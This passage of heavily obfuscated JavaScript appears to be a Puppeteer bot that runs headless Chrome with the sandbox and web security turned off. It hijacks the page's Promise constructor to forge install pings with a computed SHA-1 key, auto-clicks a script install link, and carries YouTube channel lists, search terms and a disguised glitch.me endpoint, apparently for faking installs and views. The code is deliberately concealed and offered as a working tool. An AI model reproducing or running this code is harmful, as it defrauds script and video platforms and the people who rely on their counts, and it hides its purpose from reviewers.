-0x1bb3) << y[-0xef * 0xb + -0x5a6 + 0x2 * 0x7f7 & N++], P[N >> -0x5d5 * -0x6 + 0x1539 + -0x3835] |= (0x2f0 + -0x7 * -0x24d + -0x128b | L >> 0xad * 0x20 + -0x726 * 0x5 + 0xe2a & 0x6c9 * -0x1 + -0x15a3 * 0x1 + -0x1cab * -0x1) << y[-0x1b7 * 0x4 + 0x133 * 0x11 + -0xd84 & N++], P[N >> -0x761 * -0x4 + -0xb * -0x1b0 + -0x3012] |= (0x16ce + -0x39c + -0x1 * 0x12b2 | L >> -0x2a1 * 0xe + -0x3 * 0x2f + 0x2561 & -0x82f + 0x106 * -0x11 + 0x19d4) << y[-0x245b + -0x22b9 + -0x1 * -0x4717 & N++], P[N >> 0x2b * -0x5d + -0x14b1 * -0x1 + -0x4 * 0x144] |= (0x16f2 + 0x2212 + -0x3884 | -0x22 * -0xd + 0x5d6 * -0x5 + 0x7 * 0x3f5 & L) << y[-0x133 * -0x5 + -0x1 * 0x2446 + -0x2 * -0xf25 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * 0x1cc2 + 0x1f93 + -0x291 * 0x1 ? (this['block'] = P[0x3c * -0x5f + -0x1778 + 0x2dcc * 0x1], this['start'] = N - (0x142e + -0x7cf + 0x1d * -0x6b), this['hash'](), this['hashed'] = -0xab4 + -0xb6 + 0xb6b) : this['start'] = N;
                }
                return this['bytes'] > -0x1820ac8b7 * -0x1 + 0x7a8d3 * 0x2585 + -0x1a16bfd57 && (this['hBytes'] += this['bytes'] / (0x118dfc108 + -0x3 * -0x118af9cc + -0x32a7 * 0x187b4) << 0x1 * 0x233 + -0xc50 + 0xa1d, this['bytes'] = this['bytes'] % (-0xd93d16a4 + -0x9561e86 * -0x4 + 0x1b3e49c8c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x26d9 + 0x7 * -0x537 + -0x257;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x49 * -0x79 + 0x1568 + 0xd29] = this['block'], J[K >> -0x26ad * 0x1 + -0x2608 + 0x1df * 0x29] |= x[0x1a56 + -0x9 * 0x105 + 0x1 * -0x1126 & K], this['block'] = J[-0x1 * -0xfda + -0xc4d * 0x3 + 0x151d], K >= 0x225a + 0x1 * 0x1c82 + 0x26 * -0x1a6 && (this['hashed'] || this['hash'](), J[0xf39 * 0x2 + -0x22cb + 0x459 * 0x1] = this['block'], J[-0x2 * 0x45d + -0x1 * -0x21ee + 0x4 * -0x649] = J[0xa * 0x259 + -0x1 * 0x8c9 + -0xeb0] = J[0x1cb9 + 0x2110 + -0x3dc7] = J[0x5 * 0x109 + -0x17 * 0xc7 + 0xcb7] = J[0x23 * -0x104 + 0x8 * 0x131 + 0x1a08] = J[-0x175e + 0x1 * 0x20fd + -0x1 * 0x99a] = J[0x17 * -0x165 + -0x15ad + 0x35c6 * 0x1] = J[0x1 * -0x2537 + 0x1bc4 + 0x4bd * 0x2] = J[0x428 * 0x1 + 0x1 * 0x1741 + -0x1b61 * 0x1] = J[0x1 * 0x48d + 0xa37 * 0x1 + -0xebb] = J[-0x55 + -0x347 * 0x5 + 0x10c2] = J[0x1092 + -0xb65 + 0xdb * -0x6] = J[0x2190 + -0x1e89 * 0x1 + 0x1 * -0x2fb] = J[0x1 * -0x232c + -0x1 * 0xec3 + 0x1 * 0x31fc] = J[0x1f85 + -0x17b5 + -0x7c2] = J[0x103a + 0x2 * -0x1e4 + -0xc63] = 0x2146 + -0x10d6 + 0x10 * -0x107), J[-0x553 + -0x595 * 0x1 + 0x57b * 0x2] = this['hBytes'] << -0x25d0 + -0x16dc + 0x3caf | this['bytes'] >>> 0x1460 + -0x13f8 + -0x4b, J[0x52 * -0xf + 0x1 * -0x7af + -0x16 * -0x92] = this['bytes'] << 0x1ea8 + 0x19 * 0x131 + -0x3c6e, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1d15 + -0x6e * -0x49 + -0x239; J < -0x187 * -0x13 + 0x2cf * -0x7 + -0x90c; ++J)
                K = Q[J - (-0x9fd * -0x1 + 0x11c + -0x56 * 0x21)] ^ Q[J - (0x2b3 * 0x4 + 0x5a7 * -0x1 + -0x51d * 0x1)] ^ Q[J - (-0x6a * 0xe + 0x155 * -0xb + -0x1d * -0xb5)] ^ Q[J - (0x1938 + -0x7 * -0x1d5 + -0x25fb)], Q[J] = K << -0x1 * 0x1e42 + 0x1 * -0x2113 + -0x43 * -0xf2 | K >>> -0x4d * -0x4 + -0x3c9 + -0x15a * -0x2;
              for (J = -0x1129 + 0x1b * 0xae + -0x131; J < -0x1 * 0x1ad3 + 0x2 * 0x12ff + -0xb17; J += 0xed * 0x17 + 0x7a1 + -0x1ce7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x349 + -0x819 * 0x1 + 0xb67 | L >>> 0x57 * 0x2 + 0xbdd + 0xc70 * -0x1) + (M & N | ~M & O) + P + (0x152cb * 0x62c9 + -0x6a6b9fc8 + 0x211930ff * 0x2) + Q[J] << 0x211b + 0x31 * -0x35 + -0x16f6) << 0x7 * 0x4d6 + -0x1335 + -0xd0 * 0x12 | P >>> 0x8 * -0xdf + -0x2a4 + 0x9b7) + (L & (M = M << 0xb * 0xe5 + 0xb * 0xd9 + -0x130c | M >>> 0x1e91 * -0x1 + 0x2130 + -0x29d * 0x1) | ~L & N) + O + (-0x276632d0 + -0x5eeb3 * 0x1317 + 0xf328677e) + Q[J + (-0x7d * 0x1a + -0x6 * -0x1b7 + -0x269 * -0x1)] << 0x2 * 0x43 + -0x1abc + 0x1a36) << -0x208d + -0x71 + 0x1b * 0x139 | O >>> 0xb8c + -0x8b2 + -0x13 * 0x25) + (P & (L = L << 0x1 * -0x1247 + -0x208c * -0x1 + -0xe27 | L >>> -0x2a7 * -0x7 + -0x295 + -0xa * 0x199) | ~P & M) + N + (-0x2 * -0x43f06c6f + -0xa0132c50 + 0x72b4cd0b) + Q[J + (0x8b9 + 0xc44 * 0x1 + 0x29 * -0x83)] << -0x25f2 + -0x1545 + -0x5d * -0xa3) << 0xb65 + 0x392 + -0xef2 | N >>> 0x92f + -0xfb6 * 0x1 + 0x6a2) + (O & (P = P << 0x12bf * 0x2 + 0xad7 + -0x3037 | P >>> 0x6 * -0xb7 + 0x1 * -0x822 + -0x4a * -0x2b) | ~O & L) + M + (0x435e5e1 * 0x3 + 0x6d970060 + -0xa * 0x32bd271) + Q[J + (-0xb * 0x1af + 0x133d + -0xb5 * 0x1)] << -0x1f38 + -0x2285 + 0x1 * 0x41bd) << -0x2 * 0x1227 + -0x16 * 0x139 + 0x19f * 0x27 | M >>> 0x23a * 0xe + -0xa7 * -0x8 + 0x52f * -0x7) + (N & (O = O << -0x14c5 + -0x7c4 + -0xf * -0x1e9 | O >>> 0x182d + 0x795 + 0x8 * -0x3f8) | ~N & P) + L + (-0x11 * 0x3020943 + 0x97380ecd + -0x992f7c1) + Q[J + (-0x1 * 0x248 + 0x15a2 + -0x1356)] << -0x22b1 * -0x1 + 0x1 * -0x1952 + -0x95f, N = N << -0x25f * 0xb + 0x1a2 + 0x14b * 0x13 | N >>> -0x1 * 0xd33 + 0x41c + 0x919;
              for (; J < -0x14e7 * 0x1 + 0x1 * 0x1b66 + 0x1 * -0x657; J += 0x14 * 0x49 + 0x2 * -0xfad + 0x19ab)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd43 * 0x1 + 0x120e + 0x2 * -0x263 | L >>> 0x2302 + -0xff0 + -0x5 * 0x3cb) + (M ^ N ^ O) + P + (-0x505003d * 0x16 + -0x4 * -0x9b35f55 + 0xb67a738b) + Q[J] << -0x167 * -0x1 + -0x183c + 0x491 * 0x5) << -0xe8c + 0x1 * -0x22bd + -0x2 * -0x18a7 | P >>> -0xcaf + 0x1 * 0xa36 + 0x21 * 0x14) + (L ^ (M = M << -0x7cd * -0x4 + -0x1b7b * -0x1 + -0x2f * 0x13f | M >>> -0x3ea + -0x1 * -0x249a + -0x20ae) ^ N) + O + (-0xca6f859f + 0x3dcd4 * -0x29f3 + 0x1db52027c) + Q[J + (0xac4 + 0x260a + -0x30cd)] << -0x2 * 0x8bd + -0x248b + 0x3605 * 0x1) << -0x2a * -0x16 + 0x7 * -0x9 + 0x8 * -0x6b | O >>> 0x2c6 * -0x3 + -0x235c + -0xb * -0x3fb) + (P ^ (L = L << -0x16f + -0x21b + 0x3a8 | L >>> 0x1068 + -0x2 * -0xc65 + -0x8 * 0x526) ^ M) + N + (-0xaff13bae + -0x1 * 0xcc42375e + 0x189 * 0x13fdf05) + Q[J + (-0x2309 * -0x1 + 0x23a0 + -0x1 * 0x46a7)] << 0xfc3 + -0xff6 + 0x3 * 0x11) << -0x2297 + -0x9d1 + 0x2c6d | N >>> -0x1 * -0x987 + 0x192 * 0xf + -0x3f * 0x86) + (O ^ (P = P << 0x394 + 0x1b95 + -0x1f0b | P >>> -0xcc4 * 0x1 + -0x1b25 + 0x27eb) ^ L) + M + (0x919de0d2 + -0x242c44 * -0x109 + -0x4835c795) + Q[J + (-0x35 * 0x1d + 0x1de2 + -0x5e * 0x41)] << -0x107d + 0x893 * 0x4 + -0x11cf) << -0x7 * 0x274 + 0x1 * -0x14f9 + 0x1315 * 0x2 | M >>> 0x201d + 0x1e89 + -0x3e8b) + (N ^ (O = O << -0x3d * -0x2f + -0x131 * -0xf + -0x73d * 0x4 | O >>> -0xdc9 + 0xc5b * 0x2 + 0x22f * -0x5) ^ P) + L + (-0xa82b * 0x6b89 + -0xa4634aca + 0x159e12e6e) + Q[J + (0x98a + -0x1 * 0xc5 + -0x1b * 0x53)] << -0x3 * -0x57 + 0x1e3d * -0x1 + 0x1d38, N = N << -0x1a23 * 0x1 + 0x10df + 0x962 | N >>> 0x4d0 + 0xd94 + 0x1 * -0x1262;
              for (; J < -0x7d9 + -0x4f2 + 0xd07; J += -0x2599 + -0xcdf + 0x327d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1b30 + -0x18c2 * 0x1 + -0x269 * 0x1 | L >>> -0x18a * 0x13 + 0x767 * -0x5 + 0x425c) + (M & N | M & O | N & O) + P - (0x1c7227b * -0x43 + 0x330d69 * 0x3ae + 0x2c26f0f7) + Q[J] << 0x29 * 0x99 + -0x16fa * -0x1 + 0xd * -0x3a7) << 0x19ef + 0x11bc + -0x2ba6 | P >>> 0x145 * 0x11 + -0x1ccc + 0x3a9 * 0x2) + (L & (M = M << 0xb * -0xc7 + -0xfdf + 0x15d * 0x12 | M >>> 0x12d6 + 0x49 * 0x55 + -0x69 * 0x69) | L & N | M & N) + O - (0x6e781aca * 0x1 + 0x23d05 * -0x603d + 0xd9d6928b) + Q[J + (-0xdb7 * 0x2 + 0x1a63 + 0x10c)] << -0x235e + 0xb48 + -0x1816 * -0x1) << -0x1336 * 0x2 + -0x86e + 0x2edf | O >>> -0x44 * 0x43 + 0x1 * 0x9c8 + 0x15 * 0x63) + (P & (L = L << 0x1ae9 + 0x1b4 * 0x1 + -0x1c7f | L >>> 0x247a + -0x5 * -0x595 + 0x4061 * -0x1) | P & M | L & M) + N - (0x2909b2ff + 0x778d94ea + 0xc77 * -0x3d3a3) + Q[J + (-0x1ec0 + 0x248d + -0x5cb * 0x1)] << -0x436 + -0x2f5 + 0x16f * 0x5) << 0x21db + 0x26ba * 0x1 + -0x4890 | N >>> -0x1 * -0x14f + 0x1 * 0x7ed + -0x921) + (O & (P = P << 0x31 * 0xa9 + -0x1587 + 0x5 * -0x224 | P >>> 0x1e35 + -0xb01 + -0x666 * 0x3) | O & L | P & L) + M - (-0x3cd8c44c + 0x1ee439eb + 0x8ed8cd85) + Q[J + (0x2427 + -0x2 * -0x1f0 + -0x18a * 0x1a)] << 0x1324 + 0x71b * 0x2 + -0x215a) << 0x9f3 + -0xe9c * 0x1 + 0x4ae | M >>> -0x3 * 0x46d + -0x1 * -0x23dd + -0x1 * 0x167b) + (N & (O = O << 0x28b + 0x2f * -0x21 + 0x3a2 | O >>> -0x133 * -0x8 + -0x2 * 0x1a0 + -0x656) | N & P | O & P) + L - (0xc8d038ce + 0xbb5961b2 + -0xfd5a * 0x11626) + Q[J + (-0xf7f * 0x1 + -0x1598 + 0x54d * 0x7)] << 0x232d + -0x63 * -0x5d + -0x74 * 0x9d, N = N << 0x85f + 0xede + -0x171f | N >>> 0x2288 + -0xbb * -0x35 + -0x493d * 0x1;
              for (; J < -0x8b2 + 0xd5 * 0x11 + -0x1 * 0x523; J += -0xa8b * 0x3 + 0x1d77 * -0x1 + -0x95 * -0x69)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x4cf + -0x162f + 0x1b03 | L >>> -0x192 + 0x166f + 0xa61 * -0x2) + (M ^ N ^ O) + P - (0x32fbb03e + 0x212fe341 + -0x1e8e5555) + Q[J] << 0x4 * 0x4e0 + -0xdd5 + -0x5ab) << 0x1d * -0x97 + -0x61a + 0x173a | P >>> 0xae2 + -0x1 * 0x11ea + 0x723) + (L ^ (M = M << 0x4be + -0x2 * 0x1350 + -0x220 * -0x10 | M >>> 0x1ccb * -0x1 + 0x1 * -0xa81 + 0x274e) ^ N) + O - (0x12511be * -0x38 + -0x609bb057 + -0xd654d011 * -0x1) + Q[J + (0xe2 * -0x17 + -0x655 + 0x1aa4)] << 0x1397 + -0x1b * 0xaa + -0x1a9) << -0x1ad2 * -0x1 + 0x19cf + -0x1c * 0x1e1 | O >>> -0x1063 + 0x17 * 0xa1 + 0x207) + (P ^ (L = L << 0x205d + -0xa2a * -0x2 + -0x3493 | L >>> 0x20 * -0xc4 + -0x1c39 + -0x1 * -0x34bb) ^ M) + N - (-0x8a06754 + -0x1195 * 0x4704b + 0x8c47fc25) + Q[J + (0x15e1 + -0x3 * 0x221 + -0xf7c)] << 0x37 * 0xa1 + 0x24b2 + -0x4749) << -0xbfb * -0x1 + 0x1e08 + -0x29fe | N >>> 0xb * 0x233 + 0xe5 * 0x19 + -0xfd * 0x2f) + (O ^ (P = P << -0x4e * -0x29 + -0x26dd + 0x1a7d | P >>> -0x2304 + 0x1700 + 0x6 * 0x201) ^ L) + M - (0x4bf16a24 + 0x4f95684e + -0x36e * 0x1db6fc) + Q[J + (0xd * 0x17f + -0x15 + -0x1 * 0x135b)] << -0x826 + -0x1bb * -0xb + -0xae3) << 0x1c96 + 0x10ce + 0x73 * -0x65 | M >>> -0x1469 + 0x1c0b + 0x2f * -0x29) + (N ^ (O = O << -0x1487 + 0x1672 + -0x1cd | O >>> 0x114b * -0x1 + -0x950 + 0x1a9d) ^ P) + L - (0x10148b43 + 0x2eaa5c71 + 0xe * -0xa6f9d3) + Q[J + (-0x43 * -0x7d + -0x7d9 * -0x1 + -0x14 * 0x207)] << 0x142 * -0x19 + -0x270b + 0xe19 * 0x5, N = N << -0x1 * -0xf6a + -0x1475 + 0x529 | N >>> 0x12dd + 0x388 + -0x1663 * 0x1;
              this['h0'] = this['h0'] + L << -0xbb9 + 0x8 * -0x10b + 0x1411, this['h1'] = this['h1'] + M << 0x1b5f + -0x234d + 0x7ee, this['h2'] = this['h2'] + N << 0x189c + -0xaa8 * 0x1 + -0x5e * 0x26, this['h3'] = this['h3'] + O << 0x2 * 0x329 + 0x26b + -0x1 * 0x8bd, this['h4'] = this['h4'] + P << -0x8 * 0x2bd + 0x606 * 0x3 + 0x3d6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xc * 0x2cc + -0x31c + -0x8 * 0x3cb & -0x5 * 0x76d + -0x4 * 0x359 + 0x3294] + w[J >> 0xd78 + -0x1 * 0x164f + -0x1 * -0x8ef & -0x1a3c + 0x5b7 + -0xc * -0x1b7] + w[J >> -0xe61 * -0x1 + -0xe * 0x1d3 + -0x3 * -0x3bf & -0x2536 + 0xa0e + 0x1b37] + w[J >> 0x10f6 + 0x1 * 0x5f5 + -0x16db & 0x2ff * -0xb + 0x113d * 0x1 + 0xfc7] + w[J >> -0x1bc9 + 0x1508 + 0x6cd & -0xc82 * 0x3 + -0x5 * 0x203 + 0x17d2 * 0x2] + w[J >> 0x2608 + 0x1203 + 0x44f * -0xd & 0x2526 + -0xa43 + -0x1ad4] + w[J >> -0x155b + 0xc * -0x135 + 0x23db & -0x1b8c + 0x1910 + 0x28b] + w[0xf9d + 0xdd * -0x17 + -0x44d * -0x1 & J] + w[K >> -0xf53 + -0x4f9 + 0x1468 & 0x2a5 * 0xe + 0x224f + -0x4746] + w[K >> 0x1bb9 + -0xdd8 + -0xdc9 & 0x2449 + 0x24f + -0x1 * 0x2689] + w[K >> -0x231e + -0x7c * 0x38 + 0x3e52 & 0x9f7 * 0x3 + 0x120 + -0x1ef6] + w[K >> -0x13 * -0xb5 + -0x1f9e + 0x123f & 0x796 * 0x3 + 0x917 * 0x2 + 0x12b * -0x23] + w[K >> 0x3b3 + 0x1 * -0x2179 + 0xee9 * 0x2 & -0x156c + 0x175d * 0x1 + -0x1e2] + w[K >> -0x172e + -0x1 * -0x1433 + 0x303 & 0x267a + -0x3 * 0x455 + -0x196c] + w[K >> -0x7 * -0x221 + 0x1 * -0xbb7 + -0x32c & 0x15e * 0x13 + -0x22d6 + 0x8eb] + w[0x12c6 * 0x1 + -0xa70 + -0x847 & K] + w[L >> -0xe5c + 0x161 * 0x1 + 0xd17 & 0x842 + -0x154e + 0xd1b] + w[L >> 0x1bb9 + 0x11f * 0x1c + 0x1d * -0x209 & 0x1191 + -0x1 * -0x463 + -0x15e5] + w[L >> 0x7d4 * 0x2 + -0x1dba + 0xe26 & -0xb08 + 0xe * 0x103 + -0x313] + w[L >> 0x13 * -0x1c9 + 0x1ea9 + 0x352 & -0x1bd1 + 0x1 * -0x1d39 + 0x3919] + w[L >> 0xeb8 + -0x1a * -0xd0 + 0x74 * -0x4f & -0x1c24 + -0x1a1 + 0x14c * 0x17] + w[L >> -0x21fc + 0x110a + 0x10fa & 0x6da * -0x3 + -0x2fa + 0x1797] + w[L >> 0x1 * 0x24f + -0xe * 0x250 + -0x3 * -0xa07 & 0x1bf9 + 0x1d64 + -0x394e] + w[-0x6a * -0x2b + -0x848 * -0x1 + -0x1a07 & L] + w[M >> 0x2016 + 0x802 * 0x1 + 0x9ff * -0x4 & -0x1aa0 + -0xbee + 0x269d] + w[M >> 0xd1 * -0x3 + 0x1086 + -0xdfb & -0x5e1 + -0x60d + 0xbfd] + w[M >> -0x1c76 * -0x1 + -0xdc * 0x1 + -0x1b86 & 0x14f6 + -0x4 * -0x67d + -0x1 * 0x2edb] + w[M >> 0x13c2 + -0x180c + 0x45a & 0x22a0 + -0x136d + -0xf24] + w[M >> 0xa9 * 0x29 + -0x2407 + 0x902 & 0x1926 + 0xb * -0x142 + -0xb41 * 0x1] + w[M >> 0x1526 * -0x1 + -0x101 * 0x1 + -0x765 * -0x3 & 0x1 * 0xa1f + -0x1a74 + 0x1064] + w[M >> 0x447 + 0x2e7 + 0x106 * -0x7 & -0x2 * 0xbce + -0x1 * 0x2086 + 0x3831] + w[-0x6 * 0x141 + -0x3a * -0x5d + -0xd7d & M] + w[N >> 0x1f07 + -0x25df + 0x6f4 & -0xe5f + -0x1ff7 + 0x2e65] + w[N >> -0x7 * 0x4a5 + 0x17b0 + -0x2f9 * -0x3 & 0xda2 + 0x189 + 0x1 * -0xf1c] + w[N >> -0x201 + -0x1f01 * -0x1 + -0x3 * 0x9a4 & -0x7e2 + 0x2418 + -0x1c27] + w[N >> 0xc4f * 0x3 + -0x2b * 0x17 + -0x108 * 0x20 & -0x22b + 0xda6 * -0x2 + 0x1d86] + w[N >> -0x1 * 0x1ffb + 0x70 * -0x10 + 0x2707 & -0x1 * -0x1bda + -0x13d7 + -0x7f4] + w[N >> 0x11bb + -0x5 * -0x102 + 0x16bd * -0x1 & -0x6d * -0x24 + -0x1 * 0x1cbd + 0x35e * 0x4] + w[N >> 0x89 * -0x3d + 0x1 * 0x2333 + -0x28a & 0x291 + 0x1 * -0x18bc + 0x163a] + w[0x1760 + -0x16f0 * -0x1 + -0x2e41 & N];
            }
            ['digest']() {
              const Z = b;
              this[Z(0xa, '3U![')]();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1a5a + 0xc * -0x2ce + -0x1e0d * -0x2 & 0x1 * 0x2311 + -0x1 * -0x397 + 0x25a9 * -0x1,
                J >> 0x2312 + -0x3a6 * -0x5 + -0x60 * 0x8e & 0x383 + -0x117 * 0xb + 0x979,
                J >> -0x1 * -0x959 + -0x711 + -0x240 & -0x1ff6 * -0x1 + 0x1c1 * -0xb + -0xbac,
                0x1 * -0x5dc + -0x1 * -0xf0d + -0x832 & J,
                K >> -0x55e * 0x4 + -0xa27 * 0x1 + 0x1fb7 & -0x14cc + 0x1847 + -0x27c,
                K >> 0x1f62 + 0x14d6 + -0x2 * 0x1a14 & 0x193b + 0x1596 + -0xf * 0x30e,
                K >> 0x7 * 0xd1 + -0x2166 + 0x1bb7 & -0x28b * -0x7 + -0x2308 + 0x123a,
                -0xa83 + 0x18ac + -0xd2a & K,
                L >> -0x106f * 0x1 + -0x6c7 + 0x174e & 0x21b2 + -0x1ca6 + -0x40d,
                L >> 0x56 * -0x1d + 0x10 * 0x1cf + -0x1322 & 0x433 * -0x2 + 0x1f52 + -0x15ed,
                L >> 0x470 + -0x15e8 + 0x1180 & 0x1904 * -0x1 + -0x2 * 0x77e + 0x28ff,
                -0x19f7 + -0x1a * -0xec + 0x2fe & L,
                M >> -0x6a * -0x4 + -0x1529 + 0x1399 & -0x474 + -0x2 * 0x60d + -0x118d * -0x1,
                M >> -0x6dc + 0x275 + 0x477 & -0x1a8d + -0xcb * -0x6 + 0x16ca,
                M >> -0xc * -0x41 + 0x7fd + -0xb01 & -0x3 * 0xad2 + -0x11f2 * -0x1 + 0xf83,
                -0x2004 + 0x2225 + -0x122 & M,
                N >> -0x1b54 + 0x113 * -0x1f + 0x3cb9 & -0x1 * -0x9f + 0x2 * -0x70c + 0xe78,
                N >> 0x1f1f + -0x83 * -0x29 + 0x2 * -0x1a05 & -0xd54 + 0x17f * 0x4 + 0x1ab * 0x5,
                N >> 0x43 * -0x29 + 0x5d5 + 0x4ee & 0x529 * -0x1 + -0x40 * -0x1 + 0x5e8,
                -0x81e * 0x2 + 0x9 * -0x3c4 + 0x331f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x26de * -0x1 + -0x4a5 + -0x2225 * 0x1), (K = new DataView(J))['setUint32'](0x29d * -0xc + 0x1cc7 * 0x1 + -0x295 * -0x1, this['h0']), K['setUint32'](-0x1 * 0x935 + 0x7b * -0x2b + 0x1de2, this['h1']), K['setUint32'](-0x2e3 * -0x1 + 0x14 * -0x13e + 0x1 * 0x15fd, this['h2']), K['setUint32'](-0x5ff + 0x16a8 + -0x109d, this['h3']), K['setUint32'](-0x4 * -0x3eb + 0x1d87 * 0x1 + -0x2d23, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x5 * -0x3d6 + -0x20d5 + -0x3403 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2c5 * 0x4 + 0x523 * -0x7 + 0x2f09;
            J[-0x743 + 0x1 * -0x471 + 0xbb4]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x167 * 0x7 + -0x1 * -0x403 + -0xdd4] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x10 * -0x1bb + 0xde + -0x1c8d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1aad * -0x1 + -0x19f1 + -0xbb * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x99d * 0x1 + -0x157c + -0x1 * -0x24f5), Promise['resolve'](-0x2a2 + -0x7fa + 0xa9d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x63 * -0x4d + -0x1 * -0x26d3 + 0x3 * -0x304; j < -0x926 + 0x2fe + -0x13 * -0x53; j++)
    i();
}
const NETWORK_PATIENCE = 0x2c06 + -0xac9 * 0x5 + 0x2927 + (0x22ec + 0x3a * -0x74 + 0x314) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x39d + 0x44a + 0x7e4 * -0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  const a0 = b;
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x810 + -0x1e2 * -0x5 + -0x2 * 0x8bd; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array[a0(0x8, 'a^j)')]['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 